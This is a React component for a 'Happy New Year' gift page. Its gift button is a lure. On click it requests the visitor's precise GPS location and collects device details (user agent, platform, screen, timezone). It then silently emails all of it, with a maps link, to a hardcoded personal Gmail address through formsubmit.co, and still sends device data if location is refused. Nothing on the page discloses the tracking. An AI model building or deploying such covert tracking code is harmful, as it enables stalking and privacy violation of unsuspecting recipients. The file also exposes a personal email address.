import React, { useState } from 'react';
import { Gift, Sparkles, Send } from 'lucide-react';
import './NewYearGreeting.css';

export default function NewYearGreeting() {
  const [showGift, setShowGift] = useState(false);
  const [sending, setSending] = useState(false);

  const getDeviceInfo = () => {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      viewport: `${window.innerWidth}x${window.innerHeight}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timestamp: new Date().toISOString(),
    };
  };

  const handleButtonClick = async () => {
    setSending(true);

    try {
      // Get location
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        });
      });

      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
      };

      const deviceInfo = getDeviceInfo();

      await sendEmail({
        location: locationData,
        device: deviceInfo,
      });

      setShowGift(true);
    } catch (error) {
      const deviceInfo = getDeviceInfo();

      await sendEmail({
        location: { error: 'Location access denied' },
        device: deviceInfo,
      });

      setShowGift(true);
    } finally {
      setSending(false);
    }
  };

  const sendEmail = async (data) => {
    const YOUR_EMAIL = 'chetanshende137@gmail.com'; // 👈 CHANGE THIS TO YOUR EMAIL

    const emailBody = `
Someone clicked the New Year gift!

LOCATION INFORMATION:
${data.location.error || `
Latitude: ${data.location.latitude}
Longitude: ${data.location.longitude}
Accuracy: ${data.location.accuracy} meters
Maps Link: https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}
`}

DEVICE INFORMATION:
User Agent: ${data.device.userAgent}
Platform: ${data.device.platform}
Language: ${data.device.language}
Screen: ${data.device.screenResolution}
Viewport: ${data.device.viewport}
Timezone: ${data.device.timezone}
Time: ${data.device.timestamp}
    `;

    const formData = new FormData();
    formData.append('subject', 'New Year Gift Clicked - Tracking Info');
    formData.append('message', emailBody);

    try {
      await fetch(`https://formsubmit.co/ajax/${YOUR_EMAIL}`, {
        method: 'POST',
        body: formData
      });
    } catch (error) {
      console.error('Email send error:', error);
    }
  };

  if (showGift) {
    return (
      <div className="gift-container">
        <div className="content-wrapper">
          <div className="gift-icon-wrapper bouncing">
            <Gift className="gift-icon" />
          </div>
          <h1 className="title">
            🎉 Happy New Year 2025! 🎉
          </h1>
          <p className="subtitle">
            Wishing you joy, success, and endless possibilities!
          </p>
          <div className="card">
            <Sparkles className="card-icon" />
            <p className="card-title">
              May this year bring you:
            </p>
            <ul className="wish-list">
              <li>✨ Abundant happiness</li>
              <li>💪 Great health</li>
              <li>🚀 Amazing opportunities</li>
              <li>❤️ Love and laughter</li>
            </ul>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="gift-container start-container">
      <div className="content-wrapper">
        <div className="gift-icon-wrapper">
          <Sparkles className="sparkle-icon" />
        </div>

        <h1 className="title">
          Happy New Year!
        </h1>

        <p className="description">
          I have a special New Year gift for you! 🎁
        </p>

        <button
          onClick={handleButtonClick}
          disabled={sending}
          className="gift-button"
        >
          {sending ? (
            <>
              <Send className="button-icon spinning" />
              Opening...
            </>
          ) : (
            <>
              <Gift className="button-icon" />
              Click for Your Gift!
            </>
          )}
        </button>

        <p className="footer-text">
          Click the button above to reveal your surprise! 🎊
        </p>
      </div>
    </div>
  );
}
